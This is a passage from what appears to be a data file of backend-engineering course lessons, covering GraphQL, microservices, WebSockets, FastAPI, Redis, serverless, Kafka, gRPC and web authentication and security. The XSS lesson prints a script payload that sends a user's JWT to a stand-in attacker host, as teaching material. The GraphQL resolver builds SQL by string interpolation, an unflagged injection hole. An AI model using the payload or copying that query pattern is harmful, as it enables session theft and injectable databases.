  id: ID!
  title: String!
  content: String!
}

# The Query type defines the "entry points" for reading data
type Query {
  getUser(id: ID!): User
  allPosts: [Post!]!
}
```

### 2. The Resolvers (The Logic)

The Schema tells GraphQL *what* data exists, but Resolvers tell GraphQL *where* to get it. 
A Resolver is just a standard JavaScript/Python function that queries your actual SQL database or third-party API.

For every field in the `Query` type, you must provide a matching resolver function.

```javascript
const resolvers = {
  Query: {
    // The resolver function for the 'getUser' query
    getUser: async (parent, args, context) => {
      // args.id contains the ID passed by the client's query
      const user = await database.query(`SELECT * FROM users WHERE id = ${args.id}`);
      return user;
    },
    
    allPosts: async () => {
      return await database.query(`SELECT * FROM posts`);
    }
  }
};
```

### Mutations

While `Query` is used for reading data (like REST's GET), GraphQL uses `Mutation` for creating, updating, or deleting data (like REST's POST/PUT/DELETE).

```graphql
type Mutation {
  createUser(name: String!, email: String!): User
}
```
You would then write a resolver for `createUser` that executes an `INSERT INTO` SQL statement and returns the newly created user object.""",

    ("Microservices", "Monolith vs Microservices"): """## Scaling the Engineering Organization

When a startup builds their first application, they build a **Monolithic Architecture**. 
The User Authentication, the E-commerce Checkout, and the Email Notification system are all written in the same codebase, share the same database, and run on the same server.

**Pros of a Monolith:**
- Easy to develop, test, and deploy.
- Very fast internally (functions just call other functions).

**The Breaking Point:**
As the company grows to 100+ engineers, the Monolith becomes a nightmare. 
- If the Email team deploys a bug, the entire application crashes, taking down the Checkout system.
- If the Checkout system experiences massive traffic on Black Friday, you have to scale up the entire Monolith, wasting money scaling the Email system which isn't under load.
- If a new team wants to use Go or Rust, they can't. They are trapped using the legacy Node.js codebase.

### The Microservice Architecture

Companies like Netflix and Amazon pioneered Microservices. The Monolith is chopped up into dozens of tiny, independent applications (Services). 

- **Auth Service**: Written in Go. Has its own private database.
- **Checkout Service**: Written in Java. Has its own private database.
- **Email Service**: Written in Node.js.

### How They Communicate

Because they are physically separate servers, they cannot just call a function. They must communicate over the network.

When a user buys an item, the Checkout Service successfully processes the payment, and then makes an internal HTTP/REST call (or uses a Message Queue like Kafka) to the Email Service, saying: *"User 5 bought Item 10, send them a receipt."*

**Pros of Microservices:**
- **Independent Deployment**: The Email team can deploy 10 times a day without fear of breaking the Checkout system.
- **Independent Scaling**: On Black Friday, you only pay AWS to spin up 50 extra instances of the Checkout service.
- **Technology Agnostic**: Teams can choose the best language for their specific problem.

**Cons of Microservices:**
- Exponentially more complex to monitor, debug, and trace network errors across 50 different servers.""",

    ("WebSockets", "What are WebSockets?"): """## Real-Time Bidirectional Communication

HTTP is a strictly **Unidirectional, Request-Response protocol**. 
The Client asks a question, the Server answers, and the connection hangs up. **The Server can NEVER initiate a conversation.** 

If you are building a Chat App or a Live Stock Ticker using standard HTTP, the frontend has to use **Long Polling**—asking the server in an infinite loop every 1 second: *"Are there new messages? Are there new messages?"* This destroys server performance and wastes massive amounts of bandwidth with HTTP header overhead.

### The WebSocket Protocol

WebSockets (`ws://` or `wss://`) provide a persistent, **Bidirectional** connection.

1. **The Handshake**: The client sends a standard HTTP request asking to "Upgrade" to a WebSocket connection.
2. **The Open Connection**: The server agrees. The HTTP connection is kept open indefinitely (like a phone call).
3. **Full Duplex**: Now, the Client can send data to the Server instantly, AND the Server can push data down to the Client instantly, without the Client ever asking for it!

### When to use WebSockets

WebSockets maintain a continuous TCP connection. They are heavy on server memory. Do not use them for standard CRUD APIs.

**Use cases:**
- Chat applications (WhatsApp, Slack)
- Multiplayer browser games
- Live sports scores / Stock market tickers
- Collaborative editing (Google Docs)

### Socket.io

While HTML5 provides a native `WebSocket` API, it is very low-level. It doesn't handle automatic reconnections if the wifi drops, and it doesn't support "broadcasting" to specific groups of users.

**Socket.io** is the industry standard JavaScript library for real-time apps. It provides a beautiful event-based API on top of raw WebSockets.

```javascript
// Server-side Socket.io Example
io.on('connection', (socket) => {
    console.log("A user connected!");

    // Listen for a specific event from this client
    socket.on('chat_message', (msg) => {
        // Broadcast the message to ALL connected users instantly!
        io.emit('chat_message', msg);
    });
});
```""",

    ("WebSockets", "Handling Events"): """## Event-Driven Architecture

In a standard REST API, you design routes (`app.get('/messages')`). 
In WebSockets, you don't use URLs. You design **Events**.

An event is just a string identifier paired with a JSON payload. Both the Client and the Server can `emit` (send) events, and both can `on` (listen to) events.

### The Client (Frontend)

The frontend connects to the server and sets up listeners.

```javascript
// Connect to the server
const socket = io('http://localhost:3000');

// Listen for a custom event sent BY THE SERVER
socket.on('price_update', (data) => {
    // Update the React UI instantly without refreshing!
    document.getElementById('bitcoin-price').innerText = data.price;
});

// Emit an event TO THE SERVER when a user clicks a button
function buyBitcoin() {
    socket.emit('buy_order', { amount: 1.5, userId: 42 });
}
```

### The Server (Backend)

The backend listens for events from specific clients and decides how to respond.

```javascript
io.on('connection', (socket) => {
    
    // Listen for the event sent by the client above
    socket.on('buy_order', (data) => {
        // Process the order in the database...
        console.log(`User ${data.userId} bought ${data.amount} BTC`);
        
        // Reply ONLY to the user who clicked the button
        socket.emit('order_success', { status: "complete" });
    });
});
```

### Rooms and Broadcasting

A massive feature of Socket.io is **Rooms**. 

If you are building a chat app with multiple channels (e.g., #general, #gaming), you don't want to broadcast every message to every single user on the server. You only want to broadcast to people currently looking at that channel.

```javascript
// User clicks the #gaming channel
socket.on('join_channel', (channelName) => {
    socket.join(channelName); // Puts the connection in a virtual room
});

socket.on('send_message', (msg) => {
    // This broadcasts the message ONLY to users inside the "gaming" room!
    io.to('gaming').emit('new_message', msg);
});
```""",

    ("Python FastAPI Basics", "FastAPI Setup"): """## The Modern Python Backend

For years, Python web development was dominated by two frameworks: 
- **Django**: Massive, batteries-included, but heavy and slow.
- **Flask**: Micro, easy to use, but lacked modern features.

**FastAPI** has rapidly become the modern standard. It is incredibly fast, natively supports asynchronous code (`async/await`), and its greatest feature is automatic data validation and documentation generation via Pydantic.

### The Basic Server

1. Install: `pip install fastapi uvicorn`
2. Create `main.py`

```python
from fastapi import FastAPI

# Initialize the app
app = FastAPI()

# Decorator to define a GET route
@app.get("/")
def read_root():
    # FastAPI automatically serializes Python dictionaries into JSON
    return {"message": "Hello World"}
```

To run the server, you use **Uvicorn** (an asynchronous web server):
`uvicorn main:app --reload`

### Automatic Interactive Documentation

Because FastAPI is built on modern Python type hints, it automatically generates a beautiful, interactive Swagger UI documentation page for your API.

If you navigate to `http://localhost:8000/docs`, you will see a complete UI where frontend developers can instantly test your API endpoints, see exactly what JSON payload is expected, and view the status codes. This eliminates the need to manually write API documentation in tools like Postman.

### Pydantic Data Validation

If you want to accept a POST request with JSON data in Flask, you have to manually check if `req.body['age']` exists, and if it's an integer.

In FastAPI, you define a **Pydantic** model. FastAPI automatically intercepts the incoming JSON, validates it against your model, and returns a 422 Error to the client if the data is wrong—before your code even runs!

```python
from pydantic import BaseModel

# Define the exact schema expected
class Item(BaseModel):
    name: str
    price: float
    is_offer: bool = None # Optional field

@app.post("/items/")
def create_item(item: Item):
    # 'item' is now a fully validated Python object with autocomplete!
    return {"item_name": item.name, "item_price": item.price}
```""",

    ("Python FastAPI Basics", "Path Parameters"): """## Dynamic Routing in FastAPI

Just like Express, FastAPI handles dynamic URLs effortlessly.

### Path Parameters

To capture a variable from the URL (e.g., `/items/42`), define it in the decorator string using curly braces `{}`, and pass it as an argument to the function.

```python
from fastapi import FastAPI

app = FastAPI()

# The type hint (item_id: int) is incredibly powerful!
@app.get("/items/{item_id}")
def read_item(item_id: int):
    return {"item_id": item_id}
```

**The Magic of Type Hints:**
Because we declared `item_id: int`, FastAPI will automatically parse the string from the URL into a Python integer. 
If a user goes to `/items/apple`, FastAPI will automatically intercept the request and return a 422 HTTP Error (`"msg": "value is not a valid integer"`). You never have to write validation logic!

### Query Parameters

When you declare function parameters that are **not** part of the path `{...}`, FastAPI automatically interprets them as "Query" parameters (e.g., `?skip=0&limit=10`).

```python
# The URL doesn't have {} variables
@app.get("/users/")
def read_users(skip: int = 0, limit: int = 10):
    return {"skip": skip, "limit": limit}
```

If a user hits `/users/?skip=20&limit=50`:
- `skip` becomes `20`
- `limit` becomes `50`

If a user hits `/users/`:
- `skip` defaults to `0`
- `limit` defaults to `10`

### Mixing Path, Query, and Body

FastAPI's brilliance is how it automatically figures out where data comes from based on simple Python definitions.

```python
@app.put("/items/{item_id}")
def update_item(item_id: int, item: Item, q: str = None):
    # item_id comes from the URL PATH
    # item comes from the JSON BODY (because it's a Pydantic model)
    # q comes from the QUERY STRING (because it's a simple type with a default)
    
    result = {"item_id": item_id, **item.dict()}
    if q:
        result.update({"q": q})
    return result
```
This declarative approach drastically reduces boilerplate code in backend development.""",

    ("Caching with Redis", "Redis Basics"): """## The Lightning Fast In-Memory Database

A standard PostgreSQL database stores data on a hard drive (SSD/HDD). While safe and persistent, reading from a hard drive is relatively slow. 

**Redis** (Remote Dictionary Server) is an **In-Memory** database. It stores all data directly in the server's RAM. RAM is thousands of times faster than a hard drive. Operations in Redis complete in sub-milliseconds.

### Why Use Redis? (Caching)

Imagine an e-commerce site. The homepage displays the "Top 10 Bestselling Items".
Calculating this requires the SQL database to join three massive tables and sum millions of rows. It takes 3 seconds.
If 100,000 users hit the homepage at once, the SQL database will crash.

**The Solution: A Caching Layer.**
1. User 1 hits the homepage.
2. Backend asks Redis: "Do you have the bestsellers?" -> Redis: "No." (Cache Miss)
3. Backend runs the heavy 3-second SQL query.
4. Backend takes the result and saves it in Redis as a simple Key-Value pair.
5. User 2 to User 100,000 hit the homepage.
6. Backend asks Redis: "Do you have the bestsellers?" -> Redis: "Yes, here it is!" (Cache Hit, takes 1 millisecond).

The SQL database is saved, and the users get instant load times.

### Key-Value Data Structure

Redis is fundamentally a giant dictionary (NoSQL). You store strings, lists, or hashes against unique Keys.

**Basic Commands via CLI:**
```bash
# Set a key
SET bestsellers "[Item1, Item2, Item3]"

# Get a key
GET bestsellers

# Increment a counter (Atomic and thread-safe!)
INCR page_views
```

### Implementing in Node.js

```javascript
const redis = require('redis');
const client = redis.createClient();
await client.connect();

// Express Route
app.get('/bestsellers', async (req, res) => {
    // 1. Check Redis First
    const cachedData = await client.get('bestsellers');
    if (cachedData) {
        return res.json(JSON.parse(cachedData)); // Lightning fast response
    }
    
    // 2. If not in Redis, hit the slow SQL DB
    const dbData = await slowDatabaseQuery();
    
    // 3. Save to Redis for the next user (Stringify it first!)
    await client.set('bestsellers', JSON.stringify(dbData));
    
    res.json(dbData);
});
```""",

    ("Caching with Redis", "Cache Expiration"): """## The Hardest Problem in Computer Science

*"There are only two hard things in Computer Science: cache invalidation and naming things." — Phil Karlton*

If you cache the "Top 10 Bestsellers" in Redis, the homepage loads instantly. But what happens tomorrow when the bestsellers change? 
Your SQL database updates, but Redis doesn't know! Redis will happily serve the stale, outdated cached data to your users forever.

You must implement strategies for **Cache Invalidation**.

### Strategy 1: Time-To-Live (TTL)

The easiest and most common strategy. When you save data in Redis, you tell Redis to automatically delete the key after a certain amount of time (TTL).

```javascript
// Save the data, and set it to EXPIRE (EX) in 3600 seconds (1 hour)
await client.set('bestsellers', JSON.stringify(dbData), {
    EX: 3600 
});
```

- **Pros**: Incredibly easy to implement. Guarantees data will never be more than 1 hour out of date.
- **Cons**: If the data changes 5 minutes after caching, users see wrong data for the next 55 minutes.

### Strategy 2: Write-Through / Event-Driven

If data absolutely MUST be accurate (e.g., a user's account balance), TTL is unacceptable. 

You must manually update the cache whenever the underlying SQL data changes.

```javascript
// Route to update a user's profile
app.put('/users/:id', async (req, res) => {
    // 1. Update the heavy SQL database
    await sql.updateUser(req.params.id, req.body);
    
    // 2. Manually DELETE the old data from Redis
    await client.del(`user_profile_${req.params.id}`);
    
    res.json({ status: "success" });
});
```
Now, the very next time a GET request asks for that user profile, the cache will miss, and the backend will fetch the fresh data from SQL and re-cache it.

### Common Pitfalls

If your server runs out of RAM, Redis will crash. You should configure an **Eviction Policy** in Redis (like `allkeys-lru` - Least Recently Used). This tells Redis: *"When RAM is 100% full, automatically delete the cache keys that haven't been requested in a long time to make room for new ones."*""",

    ("Serverless Functions", "AWS Lambda Basics"): """## The End of Server Maintenance

Historically, running a backend required provisioning a server (an EC2 instance on AWS, or a DigitalOcean droplet). 
You had to:
1. Choose an operating system (Linux).
2. Install Node.js or Python.
3. Open network ports.
4. Keep the server running 24/7, paying for it even when zero users were on your site at 3 AM.

**Serverless Computing** (FaaS - Functions as a Service) abstracts all of this away. You write a single function, upload it to the cloud, and AWS handles everything else.

### How AWS Lambda Works

Instead of an Express app running continuously in a `while(true)` loop, you upload a zip file containing a single JavaScript/Python function.

AWS stores the code on a hard drive. It is completely inactive.
When an event occurs (e.g., an HTTP request hits the API Gateway, or a file is uploaded to an S3 bucket), AWS instantly:
1. Provisions a micro-container.
2. Loads your code into it.
3. Executes your function.
4. Returns the response.
5. Destroys the container.

### The Pricing Model

Serverless radically changes economics. You pay **absolutely nothing** for idle time. You are billed purely by the millisecond of execution time. 
If your startup gets zero traffic on Sunday, your server bill is $0.00. 

### A Basic Lambda Function (Node.js)

```javascript
// You don't use Express or start a server. You just export a handler function.
exports.handler = async (event) => {
    // 'event' contains the incoming HTTP request data
    const name = event.queryStringParameters.name || "World";
    
    const response = {
        statusCode: 200,
        body: JSON.stringify(`Hello, ${name}!`),
    };
    
    // Return the response, and AWS destroys the environment
    return response;
};
```

### Extreme Scalability

If a blog post goes viral and 10,000 users hit your API at the exact same second, a traditional server would crash under the load. 
AWS Lambda simply spins up 10,000 independent containers simultaneously, processes all requests in parallel, and scales back down instantly.""",

    ("Serverless Functions", "Cold Starts"): """## The Drawback of Serverless

While Serverless offers infinite scalability and zero idle costs, it introduces a unique engineering problem: **The Cold Start**.

### What is a Cold Start?

When an HTTP request triggers an AWS Lambda function for the very first time, AWS has to do a lot of work:
1. Find a physical server with available capacity.
2. Spin up a secure micro-container (Firecracker microVM).
3. Download your zip file.
4. Initialize the runtime (start the Node.js or Python engine).
5. Run your global setup code (e.g., connecting to the database).
6. Finally, execute your handler function.

This entire boot-up sequence takes time—often between **500 milliseconds and 3 seconds**. This is called a Cold Start. If a user clicks a button and hits a Cold Start, the app will feel incredibly laggy.

### Warm Containers

AWS isn't stupid. Once the function finishes executing, AWS does *not* instantly destroy the container. It freezes it and keeps it "Warm" for a few minutes.

If a second user triggers the function 30 seconds later, AWS reuses the Warm container. Steps 1-5 are skipped, and the code executes in 5 milliseconds. 

- High-traffic applications rarely suffer from Cold Starts because a steady stream of traffic keeps the containers constantly Warm.
- Low-traffic applications suffer constantly, because containers are destroyed due to inactivity before the next user arrives.

### Mitigating Cold Starts

1. **Keep Packages Small**: Do not upload massive `node_modules` folders. The larger the zip file, the longer Step 3 takes.
2. **Global Initialization**: Connect to your database *outside* the handler function. Global code only runs during a Cold Start, not on Warm invocations.

```javascript
const db = require('database');
// Run this OUTSIDE the handler. It only runs once per container boot!
const connection = db.connect('uri'); 

exports.handler = async (event) => {
    // Reuse the existing connection on warm starts!
    const data = await connection.query('SELECT *'); 
    return data;
};
```
3. **Provisioned Concurrency**: A paid AWS feature where you pay a flat hourly fee to force AWS to keep X number of containers permanently Warm, guaranteeing zero cold starts, at the cost of losing the "pay only for what you use" economic benefit.""",

    ("Message Queues & Kafka", "Producers and Consumers"): """## Asynchronous Microservices

In a microservice architecture, Service A often needs to talk to Service B.

Imagine an E-commerce system: 
The `Checkout_Service` handles the credit card. It then makes an HTTP POST request to the `Email_Service` to send a receipt.
**The Problem**: What if the `Email_Service` is currently down for maintenance? The HTTP request fails, the receipt is lost forever, and the user is angry. This is called **Tight Coupling**.

We solve this using **Message Queues** (like RabbitMQ) or **Event Streaming Platforms** (like Apache Kafka).

### The Decoupled Architecture

Instead of communicating directly, services communicate through a "Middleman" (The Queue/Broker).

1. **Producers**: Services that create events.
2. **The Queue/Topic**: A persistent, ordered log of events stored by Kafka.
3. **Consumers**: Services that read events from the queue.

### The New Flow

1. User buys an item. The `Checkout_Service` (Producer) successfully charges the card. 
2. The Checkout Service sends a tiny JSON message (`{event: "Order_Paid", userId: 5}`) to **Kafka** and immediately finishes its job. It doesn't care who reads the message.
3. Kafka securely stores the message on disk.
4. The `Email_Service` (Consumer) is constantly listening to Kafka. It sees the new message, grabs it, and sends the email.

### Why this is Bulletproof

**Fault Tolerance**: If the `Email_Service` crashes and is offline for 3 hours, the system does not break! The Checkout Service continues processing orders and dumping hundreds of messages into Kafka. Kafka holds onto them. 
When the Email Service reboots, it connects to Kafka, asks "Where did I leave off?", and processes the backlog of 3 hours of emails. Zero data is lost.

**Scalability**: If you add a new `Analytics_Service` tomorrow, you don't have to rewrite the Checkout code to send data to it. The Analytics Service just connects to Kafka and starts consuming the exact same `Order_Paid` messages alongside the Email Service. Total architectural freedom.""",

    ("Message Queues & Kafka", "Consumer Groups"): """## Scaling the Consumers

If your startup takes off and you process 10,000 orders per second, a single `Email_Service` instance reading from Kafka will not be able to keep up. The backlog of unsent emails will grow exponentially.

You need to scale up to 10 instances of the `Email_Service`. But if 10 independent instances all listen to the `Orders` topic, they will ALL read the same message, and User 5 will receive 10 identical receipt emails!

Kafka solves this massive distributed systems problem using **Consumer Groups**.

### How Consumer Groups Work

When a Consumer connects to Kafka, it declares a `group.id` (e.g., `group.id = "email_cluster"`). 

Kafka guarantees a strict rule: **A single message in a topic will be delivered to ONE and ONLY ONE instance within a Consumer Group.**

1. You spin up 10 instances of your Email microservice. They all declare they are part of the `email_cluster` group.
2. Kafka receives 10,000 `Order_Paid` messages.
3. Kafka automatically load-balances the messages. Instance 1 gets message #1, Instance 2 gets message #2, etc. 
4. The work is perfectly distributed. No duplicate emails are sent.

### Multiple Groups

What about the `Analytics_Service`? You spin up 5 instances of it, and they declare `group.id = "analytics_cluster"`.

Because it is a *different* group, Kafka duplicates the data stream for them.
- Message #1 goes to exactly one instance in the `email_cluster`.
- Message #1 ALSO goes to exactly one instance in the `analytics_cluster`.

### Partitions (Under the Hood)

To achieve this magical load-balancing, Kafka requires you to split your Topic into **Partitions** (shards).
If a Topic has 10 Partitions, Kafka allows a maximum of 10 Consumers in a group to read from it concurrently (each consumer gets sole ownership of one partition). 
If you spin up 11 instances, the 11th instance will sit completely idle, waiting for one of the others to crash so it can take over its partition. 

*Engineering Rule: Always over-provision your partitions (e.g., 50 partitions) when creating a topic, so you have room to scale your consumer instances in the future.*""",

    ("gRPC & Protocol Buffers", "Protobuf Definitions"): """## Compressing the Network

JSON is the standard for web APIs because it is highly readable. But reading comes at a cost: it is extremely inefficient for computers to parse. 
If microservices send massive JSON objects back and forth millions of times a second, the network bandwidth and CPU parsing overhead become massive bottlenecks.

Google invented **Protocol Buffers (Protobuf)** as a faster, smaller, binary alternative to JSON.

### The `.proto` File

Unlike JSON, Protobuf is strongly typed. You must explicitly define the schema in a `.proto` file before any data is sent.

**user.proto**
```protobuf
syntax = "proto3";

message User {
  // Field type, name, and a unique "Tag Number"
  int32 id = 1;
  string name = 2;
  bool is_active = 3;
}
```

### The Magic of Binary

In JSON, sending `{ "id": 42, "is_active": true }` sends the literal characters `"` `i` `d` `"` across the network. 

Protobuf completely strips the keys (the field names) out of the data payload. Because both the sender and the receiver have a copy of the `.proto` schema file, they agree that "Field 1 is an integer".

The data sent over the network is just raw binary: `[Tag 1, Value 42, Tag 3, Value 1]`. 

This makes Protobuf payloads up to **5x smaller** and parsing speeds **10x faster** than JSON.

### Code Generation

You do not manually parse binary in your backend. You run the Protobuf compiler (`protoc`) on your `.proto` file. 

If you are using Go, it generates Go structs. If you are using Python, it generates Python classes.

```python
# Generated by protoc
import user_pb2

# Create an object
user = user_pb2.User()
user.id = 42
user.name = "Alice"

# Serialize to binary (ready to send over network)
binary_data = user.SerializeToString()
```
Protobuf ensures strict type safety across different microservices, even if they are written in completely different languages.""",

    ("gRPC & Protocol Buffers", "Defining Services"): """## The Successor to REST

While Protobuf replaces JSON as the data format, **gRPC** (gRPC Remote Procedure Calls) is the framework that replaces REST as the communication protocol.

REST relies on HTTP/1.1 and standard verbs (GET/POST). gRPC is built entirely on modern **HTTP/2**, allowing for multiplexing, significantly lower latency, and bidirectional streaming (similar to WebSockets).

### RPC vs REST

In REST, you think in terms of Resources:
`POST /users` (Create a user)

In RPC (Remote Procedure Call), you think in terms of Functions. You are literally executing a function that lives on a remote server as if it were a local function in your own code.
`userService.CreateUser(userData)`

### Defining the gRPC Service

You define the API endpoints directly inside the `.proto` file using the `service` keyword.

```protobuf
syntax = "proto3";

// 1. Define the Request Data
message UserRequest {
  int32 user_id = 1;
}

// 2. Define the Response Data
message UserResponse {
  string name = 1;
  string email = 2;
}

// 3. Define the Service (The API)
service UserService {
  // A remote function that takes a Request and returns a Response
  rpc GetUser (UserRequest) returns (UserResponse);
}
```

### The Developer Experience

When you run the `protoc` compiler on this file, it generates the networking boilerplate for both the Server and the Client.

**The Server (Python):**
You simply write a Python function that implements the logic, and gRPC handles the routing and binary serialization automatically.

**The Client (Node.js):**
Instead of using `fetch()` and manually typing URLs and JSON bodies, the generated Client code acts like a local library with autocomplete!

```javascript
// Node.js Microservice calling the Python Microservice
const request = new UserRequest();
request.setUserId(42);

// It feels like calling a local function, but it's making a network request!
client.getUser(request, (error, response) => {
    console.log(response.getName());
});
```
gRPC is the undisputed standard for internal backend-to-backend microservice communication at major tech companies.""",

    ("Advanced Authentication & Security", "JWT vs Session Cookies"): """## The Authentication Architecture Debate

Choosing how to maintain user state after login is a critical architectural decision. There are two primary approaches: **Stateful Sessions** and **Stateless JWTs**. Understanding the trade-offs is essential for backend engineering.

### Stateful Session Cookies

**How it Works:**
1. User logs in.
2. Server generates a random, cryptographically secure string (e.g., `session_id=abc123`).
3. Server saves `abc123` in a highly available database (like Redis), mapping it to `User 42`.
4. Server sends `abc123` to the browser in an `HttpOnly` cookie.
5. On the next request, the browser sends the cookie. The server checks Redis. If `abc123` exists and maps to User 42, the request is authorized.

**Pros:**
- **Absolute Control**: You can instantly log a user out or ban them by deleting the key from Redis. The very next request will fail.
- **Security**: The payload in the browser is just a random string. No sensitive data is exposed.

**Cons:**
- **Scalability**: Requires a centralized Redis cluster. Every single API request requires a database lookup, adding latency.

### Stateless JWTs (JSON Web Tokens)

**How it Works:**
1. User logs in.
2. Server generates a JWT containing `{ userId: 42 }` and cryptographically signs it.
3. Server sends the JWT to the client.
4. On the next request, the server verifies the mathematical signature using its secret key. No database lookup is performed!

**Pros:**
- **Infinite Scalability**: The server is completely stateless. You can spin up 1,000 backend servers behind a load balancer, and any server can instantly verify the token via CPU math.

**Cons (The Nightmare):**
- **Revocation is Impossible**: Because the server doesn't check a database, you cannot invalidate a JWT before it expires! If a hacker steals an admin's JWT, or if you ban a user, they can continue making requests until the token's expiration time runs out, because the signature is still mathematically valid.
- *Workaround*: Keep JWT lifespans very short (e.g., 15 minutes) and implement a complex Refresh Token system.""",

    ("Advanced Authentication & Security", "OAuth 2.0 Flow"): """## Delegated Authorization

If you build an app that needs to read a user's Google Calendar, you should **never** ask the user for their Google password. 

**OAuth 2.0** is the industry-standard authorization framework that allows a user to grant a third-party application limited access to their resources on another site, without exposing their credentials.

*(Note: "Log in with Google/GitHub" is technically built on OpenID Connect, an identity layer placed on top of OAuth 2.0).*

### The Authorization Code Flow

This is the most secure and common flow for web applications with a backend server.

**1. The Request (Redirect)**
Your app redirects the user's browser to the Authorization Server (Google).
`https://accounts.google.com/auth?client_id=YOUR_ID&redirect_uri=YOUR_URL&scope=calendar.read`
- *Scope*: You are explicitly requesting read-only access to the calendar.

**2. The Consent**
The user logs into Google (if not already) and clicks "Approve".

**3. The Authorization Code**
Google redirects the user *back* to your backend URL (`redirect_uri`), appending a temporary, single-use `code` to the query string.
`https://yourapp.com/callback?code=SPLIT_SECOND_SECRET`

**4. The Token Exchange (Server-to-Server)**
Your backend intercepts the `code`. It makes a secure, behind-the-scenes HTTP POST request directly to Google's API, sending:
- The `code`
- Your `client_secret` (A hardcoded password only your backend knows)

**5. The Access Token**
Google verifies the code and secret, and responds with an **Access Token** (and often a Refresh Token).

**6. API Access**
Your backend can now make HTTP requests to the Google Calendar API, attaching `Authorization: Bearer <Access_Token>` in the headers.

### Why the Complexity?

Why doesn't Google just send the Access Token in Step 3? 
Because Step 3 happens in the user's browser (the frontend), which is insecure. Hackers or malicious browser extensions could intercept the redirect and steal the permanent Access Token. 
By sending a temporary `code` to the frontend, the highly sensitive Access Token is only ever exchanged directly between secure backend servers (Step 4).""",

    ("Advanced Authentication & Security", "Role-Based Access Control (RBAC)"): """## Who Can Do What?

Authentication verifies *who* the user is. **Authorization** verifies *what* the user is allowed to do. 

The most common architecture for authorization in business applications is **Role-Based Access Control (RBAC)**.

### The Core Concept

Instead of assigning specific permissions directly to individuals (e.g., "Alice can delete posts", "Bob can delete posts"), you group permissions into **Roles**, and assign Roles to Users.

1. **Permissions**: The granular actions (`read:users`, `write:users`, `delete:posts`).
2. **Roles**: A collection of permissions (`Admin`, `Editor`, `Viewer`).
3. **Users**: Entities assigned one or more Roles.

If you want to allow 50 users to delete posts, you simply add the `delete:posts` permission to the `Editor` role. All 50 users instantly inherit the ability.

### Implementation in Express

In a backend API, RBAC is implemented using Middleware functions that run *after* the authentication middleware verifies the JWT.

```javascript
// A higher-order function that generates middleware
const requireRole = (allowedRoles) => {
    return (req, res, next) => {
        // req.user was populated by the earlier Authentication middleware
        const userRole = req.user.role; 

        if (allowedRoles.includes(userRole)) {
            next(); // User is allowed, proceed to the route
        } else {
            res.status(403).json({ error: "Forbidden: Insufficient permissions" });
        }
    };
};

// Protect the route
app.delete('/api/users/:id', 
    authenticateJWT,           // First check if they are logged in
    requireRole(['Admin']),    // Then check if they are an Admin
    (req, res) => {
        // Only Admins will ever execute this code
        database.deleteUser(req.params.id);
        res.status(204).send();
    }
);
```

### ABAC (Attribute-Based Access Control)

While RBAC is great for coarse-grained rules ("Admins can edit posts"), it fails at fine-grained rules ("Editors can only edit posts *that they authored*"). 
For complex logic, systems use ABAC, where the middleware must query the database to compare the user's ID against the `author_id` of the specific resource being requested before granting access.""",

    ("Advanced Authentication & Security", "CSRF Protection"): """## Defending Against Forged Requests

**Cross-Site Request Forgery (CSRF)** is a devious attack where a malicious website tricks a user's browser into performing an unwanted action on a trusted site where the user is currently authenticated.

### The Anatomy of the Attack

Imagine your bank uses Cookie-based authentication. You log into `bank.com`, and your browser saves the Session Cookie.
The API to transfer money is: `POST https://bank.com/transfer` with `{ to: "Alice", amount: 100 }`.

1. You leave `bank.com` open in a tab.
2. In another tab, you visit `evil-hacker.com`.
3. The hacker's website contains a hidden HTML form pointing to `https://bank.com/transfer` with `{ to: "Hacker", amount: 1000 }`.
4. The hacker's JavaScript automatically submits the form in the background.

**The Danger**: Because the request is going to `bank.com`, your browser *automatically attaches your bank Session Cookie to the request*. The bank receives the request, sees your valid cookie, and transfers the money.

### Prevention: Anti-CSRF Tokens

To stop this, the backend must prove that the request actually originated from the legitimate frontend, not a hidden form on another tab.

1. **The Token**: When the user requests the web page, the server generates a cryptographically random, one-time string (the CSRF Token) and embeds it in the HTML page (e.g., `<meta name="csrf-token" content="xyz123">`).
2. **The Client Request**: When the frontend JavaScript makes a POST request, it reads the token from the HTML and attaches it to a custom HTTP Header (e.g., `X-CSRF-Token: xyz123`).
3. **The Server Verification**: The backend intercepts the POST request. It checks if the token in the header matches the token it generated. 
   - If `evil-hacker.com` makes the request, it cannot read the token from `bank.com`'s HTML due to browser security policies (Same-Origin Policy). The hacker's request will lack the header, and the server will reject it with `403 Forbidden`.

*Note: If your API uses JWTs stored in LocalStorage and attached via the `Authorization: Bearer` header, you are naturally immune to CSRF, because browsers do not automatically attach LocalStorage data to cross-site requests.*""",

    ("Advanced Authentication & Security", "XSS Prevention"): """## Stopping Malicious Injection

**Cross-Site Scripting (XSS)** is an attack where a hacker injects malicious JavaScript into your website, which is then executed in the browsers of other users.

If an attacker achieves XSS, they essentially own the victim's browser session. They can steal LocalStorage data (including JWTs), read private messages, or perform actions on the user's behalf.

### Stored XSS (The Most Dangerous)

1. **Injection**: An attacker writes a comment on a blog: `<script>fetch('hacker.com?steal=' + localStorage.getItem('jwt'))</script>`.
2. **Storage**: The backend blindly saves this string into the database without sanitization.
3. **Execution**: A victim visits the blog. The backend pulls the comment from the database and renders it into the HTML. The victim's browser sees `<script>` and instantly executes the attacker's code. The victim's JWT is stolen.

### Prevention 1: Output Encoding (Frontend)

The primary defense against XSS happens on the frontend. Data from a database must never be rendered as executable HTML. It must be **Encoded** (e.g., converting `<script>` into the safe, visual string `&lt;script&gt;`).

Modern frontend frameworks (React, Vue, Angular) do this automatically. If you pass `<script>alert('x')</script>` into a React component, React will render it safely as text, not code.
*Danger: React's `dangerouslySetInnerHTML` bypasses this protection!*

### Prevention 2: Sanitization (Backend)

The backend should employ Defense in Depth. Never trust incoming data.
If you are building a forum where users are *allowed* to submit HTML (like bold `<b>` or italic `<i>` tags), you cannot just encode everything. You must run the input through a strict HTML Sanitizer (like `DOMPurify` or `sanitize-html` in Node.js) before saving it to the database.

```javascript
const sanitizeHtml = require('sanitize-html');

app.post('/comments', (req, res) => {
    // Strips out all <script>, <iframe>, and dangerous attributes like 'onload',
    // while leaving safe tags like <b> alone.
    const cleanComment = sanitizeHtml(req.body.comment);
    
    database.save(cleanComment);
});
```

### Prevention 3: HttpOnly Cookies

If you store JWTs in LocalStorage, XSS can steal them via JavaScript. 
If you store authentication tokens in an `HttpOnly` cookie, the browser strictly forbids JavaScript from accessing the cookie via `document.cookie`. Even if a hacker successfully executes an XSS attack, they cannot steal the token!""",

    ("Advanced Authentication & Security", "Password Hashing"): """## Securing the Database

If your company's database is hacked and leaked to the internet, the disaster scenario is not that the hacker stole emails; it's that the hacker stole plaintext passwords. Because users reuse passwords across sites, a leak at your startup compromises their email, banking, and social media.

